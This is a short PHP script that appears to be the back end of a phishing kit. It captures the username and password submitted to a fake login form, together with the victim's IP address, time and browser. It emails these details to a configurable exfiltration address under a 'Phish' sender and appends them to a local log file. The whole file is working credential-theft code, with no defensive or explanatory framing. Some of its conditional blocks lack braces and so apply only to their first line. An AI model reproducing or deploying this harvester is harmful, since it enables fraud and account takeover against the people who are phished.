<?php

// these can be specified
$exfilemail = ""; // -> enter an email address to send the details via email
$logpath = "log"; // -> make this variable empty to disable logging feature

// login info
$email = $_REQUEST['login'];
$password = $_REQUEST['password'];

// IP address of the victim
$ip = getenv("REMOTE_ADDR");

// timestamp
$timestamp=date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];

// log details
$message .= "=============+=============\n";
$message .= "Username/Email:	$email\n";
$message .= "Password:	$password\n";
$message .= "IP: 		".$ip."\n";
$message .= "Date:		".$timestamp."\n";
$message .= "User Agent:	".$browser."\n";
$message .= "===========================\n\n\n";

// email headers
if ($exfilemail != "")
    $from = 'Phish <noreply>';
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers .= 'From: '.$from."\r\n".
        'Reply-To: '.$from."\r\n" .
        'X-Mailer: PHP/' . phpversion();
    $headers .= "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
    $headers .= "Reply-To: ". strip_tags($email) . "\r\n";

    //send email
    mail($exfilemail,$subject,$message,$headers);


// save logs
if ($logpath != "")
    $handle = fopen($logpath, 'a');
    fwrite($handle, $message);
    fclose($handle);

// redirection link will be set automatically
header('Location: ""');

?>
